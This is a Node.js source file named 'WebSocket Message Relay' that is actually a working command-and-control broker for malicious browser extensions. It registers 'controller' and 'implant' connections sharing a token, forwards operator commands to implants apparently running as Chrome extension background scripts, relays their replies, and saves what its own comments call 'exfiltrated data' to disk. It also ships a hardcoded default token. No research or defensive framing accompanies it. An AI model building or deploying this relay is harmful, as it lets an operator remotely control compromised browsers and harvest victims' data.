// ============================================================
// WebSocket Message Relay
// Routes messages between server.js and background.js
// ============================================================

const http = require('http');
const fs = require('fs');
const path = require('path');

// ---- Configuration ----
const PORT = process.env.PORT || 8080;
const AUTH_TOKEN = process.env.BROKER_TOKEN || 'default-token-2026';
const DATA_DIR = path.join(__dirname, 'data');

if (!fs.existsSync(DATA_DIR)) {
  fs.mkdirSync(DATA_DIR, { recursive: true });
}

// ---- WebSocket ----
let WebSocket;
try {
  WebSocket = require('ws');
} catch {
  console.error('Install: npm install ws');
  process.exit(1);
}

// ---- State ----
// Each pair shares a TOKEN
// controllers: token -> WebSocket (your server.js)
// implants: token -> WebSocket[] (your background.js instances)
const controllers = new Map();
const implants = new Map(); // token -> [{socket, id, connectedAt}]

// Chunk tracking for optional broker-side logging
const chunks = new Map();

// ---- Helpers ----
function log(msg) {
  const ts = new Date().toISOString();
  console.log(`[${ts}] ${msg}`);
}

function saveData(clientId, label, payload) {
  const ts = new Date().toISOString().replace(/[:.]/g, '-');
  const filename = `${label}_${clientId}_${ts}.json`;
  const filepath = path.join(DATA_DIR, filename);
  fs.writeFileSync(filepath, JSON.stringify(payload, null, 2));
  log(`Saved: ${filename}`);
}

function parseQuery(url) {
  const idx = url.indexOf('?');
  if (idx === -1) return {};
  const params = {};
  url.substring(idx + 1).split('&').forEach(p => {
    const [k, v] = p.split('=');
    params[decodeURIComponent(k)] = decodeURIComponent(v || '');
  });
  return params;
}

// ---- HTTP Server ----
const server = http.createServer((req, res) => {
  if (req.url === '/') {
    res.writeHead(200, { 'Content-Type': 'text/html' });
    res.end(`<html><body style="font-family:sans-serif;padding:2rem;">
      <h1>WebSocket Message Relay</h1>
      <p>Status: Running</p>
      <p>Controllers: ${controllers.size}</p>
      <p>Implants: ${Array.from(implants.values()).reduce((a, c) => a + c.length, 0)}</p>
      <hr/>
      <p>Controller connects: <code>ws://host/?role=controller&token=xxx</code></p>
      <p>Implant connects:    <code>ws://host/?role=implant&token=xxx</code></p>
      <p>Set token via env: <code>BROKER_TOKEN=your-secret</code></p>
    </body></html>`);
  } else if (req.url === '/health') {
    res.writeHead(200, { 'Content-Type': 'application/json' });
    res.end(JSON.stringify({
      status: 'ok',
      controllers: controllers.size,
      implants: Array.from(implants.values()).reduce((a, c) => a + c.length, 0)
    }));
  } else {
    res.writeHead(404);
    res.end('Not found');
  }
});

// ---- WebSocket Server ----
const wss = new WebSocket.Server({ server });

wss.on('connection', (ws, req) => {
  const params = parseQuery(req.url);
  const role = params.role;
  const token = params.token;
  const addr = req.socket.remoteAddress;
  const clientId = `${addr}:${Date.now()}`;

  // ---- Auth ----
  if (!role || !token) {
    log(`Rejected: missing role/token from ${addr}`);
    ws.close(4001, 'Missing role or token');
    return;
  }
  if (token !== AUTH_TOKEN) {
    log(`Rejected: invalid token from ${addr}`);
    ws.close(4002, 'Invalid token');
    return;
  }

  // =====================================================
  // CONTROLLER (your server.js)
  // =====================================================
  if (role === 'controller') {
    controllers.set(token, ws);
    log(`Controller connected: ${addr} (token: ${token.substring(0,6)}...)`);

    // Notify controller of connected implants
    const implantList = implants.get(token) || [];
    if (implantList.length > 0) {
      ws.send(JSON.stringify({
        type: 'status',
        connectedImplants: implantList.length,
        message: `${implantList.length} implant(s) connected`
      }));
    }

    // Listen for commands from controller
    ws.on('message', (raw) => {
      try {
        const msg = JSON.parse(raw.toString());
        const implantList = implants.get(token) || [];

        // Forward to all implants with this token
        let targets = implantList;
        if (msg.targetId) {
          targets = implantList.filter(i => i.id === msg.targetId);
        }

        let sent = 0;
        for (const implant of targets) {
          if (implant.socket.readyState === WebSocket.OPEN) {
            implant.socket.send(raw);
            sent++;
          }
        }
        log(`Forwarded ${msg.command || msg.type || 'message'} to ${sent}/${targets.length} implant(s)`);
      } catch (e) {
        log(`Controller message error: ${e.message}`);
      }
    });

    ws.on('close', () => {
      if (controllers.get(token) === ws) {
        controllers.delete(token);
        log(`Controller disconnected: ${addr}`);
      }
    });

    ws.on('error', () => {});
    return;
  }

  // =====================================================
  // IMPLANT (your background.js / Chrome extension)
  // =====================================================
  if (role === 'implant') {
    if (!implants.has(token)) {
      implants.set(token, []);
    }
    const entry = { socket: ws, id: clientId, connectedAt: Date.now() };
    implants.get(token).push(entry);
    log(`Implant connected: ${addr} (id: ${clientId})`);

    // Notify controller
    const controller = controllers.get(token);
    if (controller && controller.readyState === WebSocket.OPEN) {
      controller.send(JSON.stringify({
        type: 'implant_connected',
        implantId: clientId,
        connectedImplants: implants.get(token).length
      }));
    }

    // Listen for messages from implant
    ws.on('message', (raw) => {
      try {
        const msg = JSON.parse(raw.toString());

        // Forward to controller
        const controller = controllers.get(token);
        if (controller && controller.readyState === WebSocket.OPEN) {
          controller.send(raw);
        }

        // Optional: save exfiltrated data at broker level
        if (msg.type === 'response' || msg.type === 'chunk') {
          if (msg.payload) {
            saveData(clientId, msg.command || 'unknown', msg.payload);
          }
        }
      } catch (e) {
        log(`Implant message error: ${e.message}`);
      }
    });

    ws.on('close', () => {
      const list = implants.get(token);
      if (list) {
        const idx = list.findIndex(e => e.id === clientId);
        if (idx !== -1) list.splice(idx, 1);
        if (list.length === 0) implants.delete(token);
      }
      log(`Implant disconnected: ${clientId}`);

      // Notify controller
      const controller = controllers.get(token);
      if (controller && controller.readyState === WebSocket.OPEN) {
        controller.send(JSON.stringify({
          type: 'implant_disconnected',
          implantId: clientId,
          connectedImplants: (implants.get(token) || []).length
        }));
      }
    });

    ws.on('error', () => {});
    return;
  }

  // ---- Unknown role ----
  log(`Rejected: unknown role "${role}" from ${addr}`);
  ws.close(4003, 'Unknown role');
});

// ---- Start ----
server.listen(PORT, '0.0.0.0', () => {
  log(`Relay listening on port ${PORT}`);
  console.log(`\n=================================================`);
  console.log(`  WebSocket Message Relay`);
  console.log(`  Port:     ${PORT}`);
  console.log(`  Token:    ${AUTH_TOKEN.substring(0,6)}...${AUTH_TOKEN.slice(-4)}`);
  console.log(`  Endpoint: ws://0.0.0.0:${PORT}`);
  console.log(`  HTTP:     http://0.0.0.0:${PORT}/`);
  console.log(`=================================================\n`);
});
